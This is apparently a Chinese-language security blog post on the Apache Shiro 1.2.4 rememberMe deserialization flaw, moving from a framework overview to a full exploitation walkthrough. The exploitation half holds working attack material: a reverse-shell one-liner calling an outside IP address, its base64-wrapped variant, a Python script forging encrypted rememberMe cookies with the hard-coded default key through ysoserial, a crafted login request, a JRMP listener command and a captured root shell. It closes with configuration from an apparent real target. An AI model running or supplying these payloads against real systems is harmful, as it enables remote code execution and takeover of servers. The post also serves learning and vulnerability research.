---
layout: about
category: about
Researchname: ShiroDeser
author: Bin4xin
wrench: 2021-11-19
permalink: /about/ShiroDeser/
toc: true
---

# 分享：Different Shiro Framework deserialization analysis ideas

**写在文前：**

本文是我自己在实践中的一些理解和经历，希望能够记录下来；
第一小结是后期在自己对这个框架有一定的认知后做的总结，修改记录可以看下面，第二小结是在学习中在网上的一些学习过程，当时也记录下来了。
故此分为两个小结。

**——致勤奋的所有人**

{: .table}
| 不一样的SHIRO框架浅析思路梳理 |
| :--- | :--- | :--- | :--- |
| SHIRO框架简介以及相关用途 | 反序列化分析 | 为什么写这样的代码 | 反序列化实战 |
| ✅简介：关于SHIRO的历史和相关实现组件 | ✅ JAVA代码反序列化FRAMES | ❎开发者写这样代码的用意 | ✅利用GADGET生成COOKIE |
| ✅用途：SHIRO框架的使用场景和解决痛点 | ✅ [调试环境部署](/about/Dynamic-analysis-of-java-framework-code/) | ❎开发者如何修复 | ✅最终目标：GETSHELL | 

---

本文初次记于2020/05/18；一次修改于2021/01/04上午；

* 添加了文章目录；
* 在原先文章基础不变的情况下，调整了整体文章的阐述框架，添加如下：
    * 技术分析；
    * 开发分析。


# 零：Shiro框架的简介和相关用途

![Alt](https://i.loli.net/2021/11/18/Ab68nZiLOqcwoh4.png#pic_center)

---

**Apache Shiro（读作“sheeroh”，即日语“城”）是一个开源安全框架，提供身份验证、授权、密码学和会话管理。**
**Shiro框架直观、易用，同时也能提供健壮的安全性。**

————来自于[维基百科](https://zh.wikipedia.org/wiki/Apache_Shiro){:target="_blank"}

## 0x01：简介

**Shiro**三个核心组件：**Subject**, **SecurityManager** 和 **Realms**.

- Subject：即“当前操作用户”。但是，在Shiro中，Subject这一概念并不仅仅指人，也可以是第三方进程、后台帐户（Daemon Account）或其他类似事物。它仅仅意味着“当前跟软件交互的东西”。
Subject代表了当前用户的安全操作，SecurityManager则管理所有用户的安全操作。

- SecurityManager：它是Shiro框架的核心，典型的Facade模式，Shiro通过SecurityManager来管理内部组件实例，并通过它来提供安全管理的各种服务。

- Realm： Realm充当了Shiro与应用安全数据间的“桥梁”或者“连接器”。也就是说，当对用户执行认证（登录）和授权（访问控制）验证时，Shiro会从应用配置的Realm中查找用户及其权限信息。

~~从这个意义上讲，Realm实质上是一个安全相关的DAO：它封装了数据源的连接细节，并在需要时将相关数据提供给Shiro。~~
~~当配置Shiro时，你必须至少指定一个Realm，用于认证和（或）授权。配置多个Realm是可以的，但是至少需要一个。~~
~~Shiro内置了可以连接大量安全数据源（又名目录）的Realm，如LDAP、关系数据库（JDBC）、类似INI的文本配置资源以及属性文件等。如果系统默认的Realm不
能满足需求，你还可以插入代表自定义数据源的自己的Realm实现。~~


## 0x02：用途

> Apache Shiro是Java的一个安全框架。Shiro可以非常容易的开发出足够好的应用，其不仅可以用在JavaSE环境，也可以用在JavaEE环境，
> Shiro可以帮助我们完成：认证、授权、加密、会话管理、与Web集成、缓存等。

上面说的比较官方一点，我们可以简单一点理解，她就是一个`开源的集成权限框架`，这是我们在市面上很多的应用。我们在漏洞挖掘的过程中，如果存在WEB验证机制，
有可能会存在登录绕过，所以


**现在很多j2ee开发都会采用shiro框架来做权限控制，框架的优势是十分明显的，但凡事有利有弊，有优势当然就存在劣势。shiro是我在参加工作后才会慢慢去接触到；
从一开始的代审，再到黑盒渗透，再到前一段时间刚结束的HW行动。**


>目前，使用Apache Shiro的人越来越多，因为它**相当简单**，对比Spring Security，
>可能没有Spring Security做的功能强大，但是在实际工作时可能并不需要那么复杂的东西，所以使用小而简单的Shiro就足够了。
>对于它俩到底哪个好，这个不必纠结，能更简单的解决项目问题就好了。

# 一：Shiro框架反序列化的原因


`return rmm.getRememberedPrincipals(subjectContext);`

## 1x01：Shiro代码层分析

- **web.xml**

```xml
<welcome-file-list>
    <welcome-file>index.jsp</welcome-file>
</welcome-file-list>
```

代码大致逻辑：

```java
<jsp:forward page="home.jsp"/>
//跳到home.jsp home页面包含include.jsp
<%@ include file="include.jsp" %>
//include.jsp导入SecurityUtils类
<%@ page import="org.apache.shiro.SecurityUtils" %>
```

<a href="#"> <i class="fa fa-hand-o-down"></i></a> 

<kbd>⌘</kbd>+ 左键单击 `SecurityUtils` 跳转`shiro-core-1.2.4.jar!/org/apache/shiro/SecurityUtils.class`
那么我们假设SecurityUtils类是shiro框架认证入口，那么我们只需要梳理清楚对应代码逻辑即可；

参考

- https://www.jianshu.com/p/ccd0b79db702
- https://blog.csdn.net/w1196726224/article/details/53560385


先直接在home.jsp页面处下断点，处理流程大概如下：
- JavaServer Pages：
    ```java
    _jspService(HttpServletRequest, HttpServletResponse):21, index_jsp
    //正常jsp server请求
    service(HttpServletRequest, HttpServletResponse):71, HttpJspBase
    //server响应request，返回JSESSIONID
    service(ServletRequest, ServletResponse):733, HttpServlet
    //以返回的JSESSIONID COOKIE访问http://127.0.0.1:8080/shiro/account
    ```
- Server Applet
    ```
    httpServerlet
    ```
- Shiro web Serverlet
    ```
    ShiroHttpServletRequest
    ```


web http访问后，访问调用如下：
```bash
this = {index_jsp@4030} 
request = {ShiroHttpServletRequest@5282} 
response = {ResponseFacade@4532} 
_jspx_method = "GET"
out = {JspWriterImpl@5284}
_jspx_out = {JspWriterImpl@5284} 
_jspx_page_context = {PageContextImpl@5285} 
pageContext = {PageContextImpl@5285} 
```
基本上就是这个流程；
## 1x02：为什么这么写

<h1>更新中...</h1>

# 二：验证
在上面的简述中，可以来进行shiro框架的判断漏洞特征：

 - 1.在返回包的Set-Cookie的值为「rememberMe=deleteMe」；
 - 2.JESSession Cookie.实际渗透中如果遇到可以尝试加入rememberMe Cookie探测是否使用shiro框架；
 - 3.特定CMS集成shiro框架；
    - 1）jeesite
    - 2）iBase4J
    - 等等

 
同时，我们可以进一步对shiro框架是否存在反序列化来进行验证：
用到的是[Shiroscan by 斯文](http://www.svenbeast.com/post/tskRKJIPg/){:target="_blank"}脚本，开源在github上，用法就不多赘述。
```bash
python3 shiro_rce.py https://shiro.vuln.ip/login.html "ping x.dnslog.cn"
 ____  _     _          ____                  
/ ___|| |__ (_)_ __ ___/ ___|  ___ __ _ _ __  
\___ \| '_ \| | '__/ _ \___ \ / __/ _` | '_ \ 
 ___) | | | | | | | (_) |__) | (_| (_| | | | |
|____/|_| |_|_|_|  \___/____/ \___\__,_|_| |_|

                           By 斯文

Welcome To Shiro反序列化 RCE ! 
[*]  开始检测模块 Class1:CommonsBeanutils1
```
然后脚本开始对不同的秘钥进行生成cookie，尝试让机器执行命令。等待脚本在跑的时候或者跑完，看一下dnslog上的dns记录，如果存在记录如下所示，那么就说明存在反序列化漏洞使得机器执行了任意代码，反之则无：
```bash
x.dnslog.cn    shiro.vuln.ip 2020-07-02 16:46:35
x.dnslog.cn    shiro.vuln.ip 2020-07-02 16:45:52
x.dnslog.cn    shiro.vuln.ip 2020-07-02 16:45:52
x.dnslog.cn    shiro.vuln.ip 2020-07-02 16:45:52
```
当然有的时候用shiroScan扫结束后并没有记录，即不存在漏洞；但是像我，又不死心，于是又在网上折腾找了另外一个能够跑秘钥的探测脚本-_-
[作者博客](https://www.bacde.me/post/Apache-Shiro-Deserialize-Vulnerability/){:target="_blank"}
```bash
python shiro_exp.py https://shiro.vuln.ip/login.html
try CipherKey :4AvVhmFLUs0KTA3Kprsdag==
generator payload done.
send payload ok.
checking.....
checking.....
checking.....
checking.....
vulnerable:true url:https://shiro.vuln.ip/login.html    CipherKey:3AvVhmFLUs0KTA3Kprsdag==
```
当然秘钥对于我们理解shiro反序列化框架也有一定的帮助，shiro的反序列化最初的漏洞来源也是因为秘钥硬编码。

## 2x01：getshell
通过上面的步骤我们就可以对shiro反序列化做一个判定，肯定是存在RCE漏洞，那么来实现我们的最终目的，GET-shell一般反弹shell的执行代码`bash -i >& /dev/tcp/47.52.233.92/11111 0>&1`，首先需要把代码进行base64编码，只有经过base64编码后shiro才认得这个命令，通过shiro自己本身的base64解码最终达到执行命令的目的；
转成base64编码->`bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny41Mi4yMzMuOTIvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}`；

像我比较偷懒，就直接在脚本上添加反弹shell，这样的好处就是我们不需要在生成poc的脚本里替换cookie，由脚本自动生成的cookie自动去跑，省事很多
[我是转换网址:-)](http://www.jackson-t.ca/runtime-exec-payloads.html){:target="_blank"}
监听端口等待shell回连（我这里的样例是docker环境）
```
nc -lvvp 11111
Listening on [0.0.0.0] (family 0, port 11111)
Connection from 59.110.152.168 47274 received!
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@6d5a7848dbef:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```

## 2x02：学习工具
使用ysoserial进行流量监听，下面是ysoserial的jar包生成，懂得开发同学都懂。
```
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial
mvn package -D skipTests
```

## 2x03：how to poc
使用poc代码获得对应的rememberMe的cookie值。
```
# -*- coding:utf-8 -*-
import sys
import uuid
import base64
import subprocess
from Crypto.Cipher import AES

def encode_rememberme(command):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

if __name__ == '__main__':
    payload = encode_rememberme(sys.argv[1])    
print "rememberMe={0}".format(payload.decode())
```
```
D:\bin4xin\code\shiro\shrio-poc\ysoserial\target> python .\shrio-poc.py 47.52.233.92:6666
rememberMe=W8BOhPe8Qdy8FJ5N9genqt4WjZaONr1NQ+dXgDCV1RrGHUwMfd8ljlA9AG64t7vzUesOp7YKsz6EFFHgyrq1qRqUiPFBnEBi/NNNpE2UR8CgMsf1KY2rbBurFv1Gwslv2+SL7hy3YNq9cpPWm5S8o+nJpa6IyI9cZ+n7a+6hjB4Yfnf89u3BLi4AxOXL35SotH2AdSX2iZrWgGAcah9oW21JwpC2zj4YMjsGf2tPYUysP873bYYHuSIohaXf3bcq4YuQajMctVmM3IvjeY5Ggva9QRUvo5B1o0sPNHdXGwn/z9t/KWcSeTWE+Dt2f95a9QjEIoic6s88Tv0SKjY6UdCmTxN3vVE8rs1haiA48R1CuUQQiWa9V28m2qkonX9aUEUl4kTGGvF+Y5eB4MaNTw==
```

抓包，前台登录拦包，勾选`Remember Me`，截获数据包，替换cookie构造数据包：

```
POST /doLogin HTTP/1.1
underattack-host: underattack-host:8080
Content-Length: 55
Cache-Control: max-age=0
Origin: http://underattack-host:8080
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://underattack-host:8080/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: rememberMe=RFUadguvSoq4kMm3ZwnkO/MHiokCrqrCURXUqUWaXLBM7/fBF65qvjWDFZeh49zHDRm5oKPU1AhmbEBaYRp3ASrQpHdp7mYrChOi51tmq9qkzWemDnjbUXtp8B6RF1EUNV2q2tKaKlf4AAR1hZIRJGbz4CpLeumNAeWB98f6/T0GaWJGGve9rP6l9/7iU5Y9Xj4ZmSBP6LgMHYF3TJ2DDdTNI4nPITeQI3S+9ol/BmT14Be5m0ENfOkm1cdm3L8Rj/pbeE842Y3nUioEdAXizCrOsCYT+u2QTWHt1YZLmB/xsfQvEV5bRpRJeRv/ps7V00PiXvCeaPQoDs541wqB75+/RRAdqU8TWnJE7YhvQVkxTRLvCjBTtwfkgA3XVA8X+518nh0wSoj8/Ajaoi5MbA==
Connection: close

username=asdmnin&password=asdasd&rememberme=remember-me
```
使用包监听6666端口：
```
root@iZj6cgn7odv59wmjjhe6zwZ:/home/tool/shiro_poc/POC-2/ysoserial/target# java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny41Mi4yMzMuOTIvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}'
* Opening JRMP listener on 6666
```
发包，我们看到jrmp监听的端口已经有流量回流回来了，如下：
```
Have connection from /underattack-host:58272
Reading message...
Is DGC call for [[0:0:0, 356978429], [0:0:0, 2006635131]]
Sending return with payload for obj [0:0:0, 2]
Closing connection
Have connection from /underattack-host:58274
Reading message...
Is DGC call for [[0:0:0, 356978429], [0:0:0, -1104978848], [0:0:0, 2006635131]]
Sending return with payload for obj [0:0:0, 2]
Closing connection
```

## 案例

/usr/local/nginx/conf/nginx.conf

inet addr:192.168.100.242  Bcast:192.168.100.255  Mask:255.255.255.0

```xml
  <!-- Apache Shiro -->
  <filter>
    <filter-name>shiroFilter</filter-name>
    <filter-class>org.springframework.web.filter.DelegatingFilterProxy</filter-class>
    <init-param>
      <param-name>targetFilterLifecycle</param-name>
      <param-value>true</param-value>
    </init-param>
  </filter>
  <filter-mapping>
    <filter-name>shiroFilter</filter-name>
    <url-pattern>/*</url-pattern>
  </filter-mapping>

  <!-- PageCache, cache .html suffix.
  <filter>
    <filter-name>PageCacheFilter</filter-name>
    <filter-class>com.thinkgem.jeesite.common.filter.PageCachingFilter</filter-class>
  </filter>
  <filter-mapping>
    <filter-name>PageCacheFilter</filter-name>
    <url-pattern>/</url-pattern>
  </filter-mapping>
  <filter-mapping>
    <filter-name>PageCacheFilter</filter-name>
    <url-pattern>*.html</url-pattern>
  </filter-mapping>-->

  <!-- SiteMesh -->
  <filter>
    <filter-name>sitemeshFilter</filter-name>
    <filter-class>com.opensymphony.sitemesh.webapp.SiteMeshFilter</filter-class>
  </filter>
  <filter-mapping>
    <filter-name>sitemeshFilter</filter-name>
    <url-pattern>/a/*</url-pattern>
  </filter-mapping>
  <filter-mapping>
    <filter-name>sitemeshFilter</filter-name>
    <url-pattern>/f/*</url-pattern>
  </filter-mapping>
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:context="http://www.springframework.org/schema/context" xsi:schemaLocation="
    http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd
    http://www.springframework.org/schema/context  http://www.springframework.org/schema/context/spring-context-4.0.xsd"
  default-lazy-init="true">

  <description>Shiro Configuration</description>

    <!-- 加载配置属性文件 -->
  <context:property-placeholder ignore-unresolvable="true" location="classpath:jeesite.properties" />
  
  <!-- Shiro权限过滤过滤器定义 -->
  <bean name="shiroFilterChainDefinitions" class="java.lang.String">
    <constructor-arg>
      <value>
        /static/** = anon
        /userfiles/** = anon
        ${adminPath}/cas = cas
        ${adminPath}/login = authc
        ${adminPath}/isValidateKlp = anon
        ${adminPath}/queryLoingname = anon
        ${adminPath}/ukeyIsExist = anon
        ${adminPath}/validSlider/** = anon
        ${adminPath}/dataInterface/** = anon
        ${adminPath}/sys/forget/** = anon<!-- 登录页忘记密码 -->
        ${adminPath}/logout = logout
        ${adminPath}/** = user
        /act/rest/service/editor/** = perms[act:model:edit]
        /act/rest/service/model/** = perms[act:model:edit]
        /act/rest/service/** = user
        /ReportServer/** = user
        
        ${mobilePath}/** = anon
      </value>
    </constructor-arg>
  </bean>
  
  <!-- 安全认证过滤器 -->
  <bean id="shiroFilter" class="org.apache.shiro.spring.web.ShiroFilterFactoryBean">
    <property name="securityManager" ref="securityManager" /><!-- 
    <property name="loginUrl" value="${cas.server.url}?service=${cas.project.url}${adminPath}/cas" /> -->
    <property name="loginUrl" value="${adminPath}/login" />
    <property name="successUrl" value="${adminPath}?login" />
    <property name="filters">
            <map>
                <entry key="cas" value-ref="casFilter"/>
                <entry key="authc" value-ref="formAuthenticationFilter"/>
            </map>
        </property>
    <property name="filterChainDefinitions">
      <ref bean="shiroFilterChainDefinitions"/>
    </property>
  </bean>
  
  <!-- CAS认证过滤器 -->  
  <bean id="casFilter" class="org.apache.shiro.cas.CasFilter">  
    <property name="failureUrl" value="${adminPath}/login"/>
  </bean>
  
  <!-- 定义Shiro安全管理配置 -->
  <bean id="securityManager" class="org.apache.shiro.web.mgt.DefaultWebSecurityManager">
    <property name="realm" ref="systemAuthorizingRealm" />
    <property name="sessionManager" ref="sessionManager" />
    <property name="cacheManager" ref="shiroCacheManager" />
  </bean>
  
  <!-- 自定义会话管理配置 -->
  <bean id="sessionManager" class="com.thinkgem.jeesite.common.security.shiro.session.SessionManager"> 
    <property name="sessionDAO" ref="sessionDAO"/>
    
    <!-- 会话超时时间，单位：毫秒  -->
    <property name="globalSessionTimeout" value="${session.sessionTimeout}"/>
    
    <!-- 定时清理失效会话, 清理用户直接关闭浏览器造成的孤立会话   -->
    <property name="sessionValidationInterval" value="${session.sessionTimeoutClean}"/>
<!--      <property name="sessionValidationSchedulerEnabled" value="false"/> -->
    <property name="sessionValidationSchedulerEnabled" value="true"/>
    
    <property name="sessionIdCookie" ref="sessionIdCookie"/>
    <property name="sessionIdCookieEnabled" value="true"/>
  </bean>
  
  <!-- 指定本系统SESSIONID, 默认为: JSESSIONID 问题: 与SERVLET容器名冲突, 如JETTY, TOMCAT 等默认JSESSIONID,
    当跳出SHIRO SERVLET时如ERROR-PAGE容器会为JSESSIONID重新分配值导致登录会话丢失! -->
  <bean id="sessionIdCookie" class="org.apache.shiro.web.servlet.SimpleCookie">
      <constructor-arg name="name" value="jeesite.session.id"/>
      <property name="path" value="/" />
  </bean>

  <!-- 自定义Session存储容器 -->
  <bean id="sessionDAO" class="com.thinkgem.jeesite.common.security.shiro.session.JedisSessionDAO">
    <property name="sessionIdGenerator" ref="idGen" />
    <property name="sessionKeyPrefix" value="${redis.keyPrefix}:user:session_" />
  </bean> 
  <!--<bean id="sessionDAO" class="com.thinkgem.jeesite.common.security.shiro.session.CacheSessionDAO">
    <property name="sessionIdGenerator" ref="idGen" />
    <property name="activeSessionsCacheName" value="activeSessionsCache" />
    <property name="cacheManager" ref="shiroCacheManager" />
  </bean>-->
  
  <!-- 定义授权缓存管理器 -->
<!--  <bean id="shiroCacheManager" class="com.thinkgem.jeesite.common.security.shiro.cache.SessionCacheManager" /> -->
  <bean id="shiroCacheManager" class="org.apache.shiro.cache.ehcache.EhCacheManager">
    <property name="cacheManager" ref="cacheManager"/>
  </bean>
  
  <!-- 保证实现了Shiro内部lifecycle函数的bean执行 -->
  <bean id="lifecycleBeanPostProcessor" class="org.apache.shiro.spring.LifecycleBeanPostProcessor"/>
  
  <!-- AOP式方法级权限检查  -->
  <bean class="org.springframework.aop.framework.autoproxy.DefaultAdvisorAutoProxyCreator" depends-on="lifecycleBeanPostProcessor">
    <property name="proxyTargetClass" value="true" />
  </bean>
  <bean class="org.apache.shiro.spring.security.interceptor.AuthorizationAttributeSourceAdvisor">
      <property name="securityManager" ref="securityManager"/>
  </bean>
  
</beans>
```

以上。
